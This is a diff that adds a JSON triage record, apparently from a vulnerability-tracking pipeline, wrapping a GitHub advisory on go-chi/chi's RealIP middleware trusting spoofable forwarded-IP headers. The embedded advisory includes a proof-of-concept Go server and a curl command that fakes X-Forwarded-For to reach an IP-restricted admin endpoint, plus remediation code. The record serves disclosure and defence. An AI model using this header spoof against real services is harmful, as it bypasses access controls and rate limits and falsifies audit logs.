@@ -1,0 +1,63 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/178949074?v=4\", \"events_url\": \"https://api.github.com/users/rezmoss/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/rezmoss/followers\", \"following_url\": \"https://api.github.com/users/rezmoss/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/rezmoss/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/rezmoss\", \"id\": 178949074, \"login\": \"rezmoss\", \"node_id\": \"U_kgDOCqqL0g\", \"organizations_url\": \"https://api.github.com/users/rezmoss/orgs\", \"received_events_url\": \"https://api.github.com/users/rezmoss/received_events\", \"repos_url\": \"https://api.github.com/users/rezmoss/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/rezmoss/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/rezmoss/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/rezmoss\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 7.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P\"}}, \"cwes\": [{\"cwe_id\": \"CWE-290\", \"name\": \"Authentication Bypass by Spoofing\"}, {\"cwe_id\": \"CWE-348\", \"name\": \"Use of Less Trusted Source\"}], \"description\": \"### Summary\\nrealip middleware in go-chi/chi trusts headers like x-forwarded-for without checking them, so attackers can fake their ip and bypass rate limits or access controls\\n\\n### Details\\n\\nthe vuln is in middleware/realip.go , the realIP() function pulls IPs straight from client headers and replaces r.RemoteAddr without checking if the request came from a trusted proxy\\n\\n```go\\nfunc realIP(r *http.Request) string {\\n    var ip string\\n    if tcip := r.Header.Get(trueClientIP); tcip != \\\"\\\" {\\n        ip = tcip  // controlled by attacker\\n    } else if xrip := r.Header.Get(xRealIP); xrip != \\\"\\\" {\\n        ip = xrip  // controlled by attacker\\n    } else if xff := r.Header.Get(xForwardedFor); xff != \\\"\\\" {\\n        ip, _, _ = strings.Cut(xff, \\\",\\\")  // controlled by attacker\\n    }\\n    // ...\\n    return ip\\n}\\n```\\n\\nno trusted proxy cidr check in place, any client can send these headers\\n\\n### PoC\\n\\ncreate a server with chi and use realip middleware\\n\\n```go\\npackage main\\n\\nimport (\\n    \\\"fmt\\\"\\n    \\\"net/http\\\"\\n    \\\"github.com/go-chi/chi/v5\\\"\\n    \\\"github.com/go-chi/chi/v5/middleware\\\"\\n)\\n\\nfunc main() {\\n    r := chi.NewRouter()\\n    r.Use(middleware.RealIP)\\n\\n    r.Get(\\\"/admin\\\", func(w http.ResponseWriter, r *http.Request) {\\n        // ip-based access control got bypassed\\n        if r.RemoteAddr == \\\"127.0.0.1\\\" {\\n            w.Write([]byte(\\\"SECRET ADMIN DATA\\\"))\\n            return\\n        }\\n        http.Error(w, \\\"Forbidden\\\", 403)\\n    })\\n\\n    http.ListenAndServe(\\\":8080\\\", r)\\n}\\n```\\n\\nspoofed the ip to bypass access control\\n\\n```bash\\ncurl -H \\\"X-Forwarded-For: 127.0.0.1\\\" http://localhost:8080/admin\\n```\\n\\n\\n### Impact\\n\\n- ip-based access control bypass lets attackers reach restricted endpoints\\n- rate limiting bypass lets attackers avoid limits by rotating spoofed ips\\n- audit logs show fake ips picked by attacker instead of real ones\\n- attackers can get around geo ip restrictions\\n\\n## Remediation Recommendation\\n\\nvalidate proxy cidr first before trusting forwarded ip headers\\n\\n```go\\n// add your reverse proxy ip addresses here\\nvar trustedProxies = []net.IPNet{\\n       {IP: net.ParseIP(\\\"10.0.0.0\\\"), Mask: net.CIDRMask(8, 32)},\\n    {IP: net.ParseIP(\\\"172.16.0.0\\\"), Mask: net.CIDRMask(12, 32)},\\n    {IP: net.ParseIP(\\\"192.168.0.0\\\"), Mask: net.CIDRMask(16, 32)},\\n}\\n\\nfunc isTrustedProxy(ip net.IP) bool {\\n    for _, cidr := range trustedProxies {\\n        if cidr.Contains(ip) {\\n            return true\\n        }\\n    }\\n    return false\\n}\\n```\", \"ghsa_id\": \"GHSA-rjr7-jggh-pgcp\", \"github_reviewed_at\": \"2026-06-25T18:19:15Z\", \"html_url\": \"https://github.com/advisories/GHSA-rjr7-jggh-pgcp\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-rjr7-jggh-pgcp\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-25T18:19:15Z\", \"references\": [\"https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp\", \"https://github.com/go-chi/chi/releases/tag/v5.3.0\", \"https://github.com/advisories/GHSA-rjr7-jggh-pgcp\"], \"repository_advisory_url\": \"https://api.github.com/repos/go-chi/chi/security-advisories/GHSA-rjr7-jggh-pgcp\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/go-chi/chi\", \"summary\": \"chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-25T18:19:17Z\", \"url\": \"https://api.github.com/advisories/GHSA-rjr7-jggh-pgcp\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/go-chi/chi/middleware\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.5.5\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/go-chi/chi/v2/middleware\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.1.1\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/go-chi/chi/v3/middleware\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.3.5\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/go-chi/chi/v4/middleware\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.1.3\"}, {\"first_patched_version\": \"5.3.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/go-chi/chi/v5/middleware\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 5.3.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-rjr7-jggh-pgcp",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/go-chi/chi/middleware: <= 1.5.5",
+      "github.com/go-chi/chi/v2/middleware: <= 2.1.1",
+      "github.com/go-chi/chi/v3/middleware: <= 3.3.5",
+      "github.com/go-chi/chi/v4/middleware: <= 4.1.3",
+      "github.com/go-chi/chi/v5/middleware: < 5.3.0"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/go-chi/chi/middleware",
+      "github.com/go-chi/chi/v2/middleware",
+      "github.com/go-chi/chi/v3/middleware",
+      "github.com/go-chi/chi/v4/middleware",
+      "github.com/go-chi/chi/v5/middleware"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.222050Z",
+  "provenance": {
+    "content_sha256": "ec9bf83eb0aed485d659202ca46b301fc5e6c08cfccc0a2d39adadacee658a14",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-25T18:19:15Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-rjr7-jggh-pgcp",
+  "status": "active",
+  "title": "chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header",
+  "updated_at": "2026-06-25T18:19:17Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-rjr7-jggh-pgcp"
+}
